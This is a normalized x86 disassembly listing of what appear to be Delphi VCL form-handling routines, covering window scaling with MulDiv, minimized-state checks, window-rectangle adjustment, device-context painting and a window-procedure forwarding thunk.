mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_45f304
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41b288
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4032e0
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
sub_45f384
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40358c
and [ ebx + 0x2f4 ] 0xdf
sub_45f3bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45e9c8
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4466f4
xor edx edx
mov eax ebx
call sub_446718
mov edx 0x140
mov eax ebx
call sub_446740
mov edx 0xf0
mov eax ebx
call sub_446764
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d95c
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45fcd8
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_445b60
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4032d8
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_46003c
xor edx edx
mov eax ebx
call sub_447148
xor edx edx
mov eax ebx
call sub_4470b0
mov dl 0x1
mov eax ebx
call sub_44d8e4
mov edx ebx
mov eax [ rw-data ]
call sub_4646a0
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_45f535
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_423d48
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41b7f0
xor edx edx
mov eax ebx
call sub_41eb78
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_463548
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_45f5a0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40375c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45f66a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461ec4
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4646d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403390
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403390
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d7a0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_45ea40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f671
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_45f684
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_45f6c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46003c
sub_45f6ca
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40358c
test al al
jne r-xdata
call sub_403bd8
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403b84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46003c
sub_45f700
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_45f741
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45f760
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_449040
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_461a08
sub_45f79c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_446454
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41b4f8
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_460e00
mov edx esi
mov eax ebp
call sub_41b7f0
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_460dd8
mov edx esi
mov eax edi
call sub_460e00
jmp r-xdata
xor edx edx
mov eax edi
call sub_460db4
sub_45f8a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a004
xor edx edx
push ebp
push sub_45fafe
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449760
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4469a0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4469e4
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_45fc30
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_448138
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb05
mov eax [ ebp - 0x4 ]
call sub_44a00c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45ef08
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44d230
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45ef08
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d230
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_42701c
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_427024
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_45fb0d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44aaac
push 0x0
push 0x0
push ebx
push sub_45fc14
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_45fbe0
push ebx
push sub_45fbf8
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_45fbbf
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41f270
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4470b0
sub_45fc4b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45ef08
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d230
mov eax ebx
call sub_45fd34
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_4270c0
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4270dc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4469cc
mov ebp eax
push edi
push esi
mov eax ebx
call sub_446988
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_45ffdc
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_46000c
sub_45fcd8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_44d7a4
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_462038
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop ebx
retn
sub_45fd6c
push ebx
mov ebx eax
mov eax ebx
call sub_460c88
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45fe00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d7a4
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44d86c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_44d7a4
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_44d7a4
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_45fe88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_44dd48
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4240cc
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4240a0
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40358c
test al al
jne r-xdata
sub_45fef4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4032d8
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45ff20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebp
call sub_44a49c
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_4240cc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_44dd90
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4240a0
mov si 0xfff1
call sub_40358c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4240dc
jmp r-xdata
sub_45ffb4
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44716c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_448138
sub_45ffdc
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4469a0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_46000c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4469e4
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_46003c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_446ea4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_461174
pop esi
pop ebx
retn
sub_460080
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_4600d9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4600e0
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
sub_4600e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_446e58
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_44acc4
mov eax ebx
call sub_44ae60
sub_460120
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_423f18
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_460160
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b180
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40358c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_40358c
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_448138
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45a1dc
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_460a8c
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4603d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4603bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_427dd0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_427c70
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45b76c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4603c3
xor edx edx
mov eax [ ebp - 0xc ]
call sub_427dd0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45a1dc
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_460a8c
call sub_44d7a4
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_460507
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4604e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4604c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_427dd0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_427c70
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4604ca
xor edx edx
mov eax [ ebp - 0xc ]
call sub_427dd0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_44d7a4
mov esi eax
sub_4604e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ReleaseDC
retn
sub_460598
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4605e4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_460ac0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_460b0c
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_460624
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
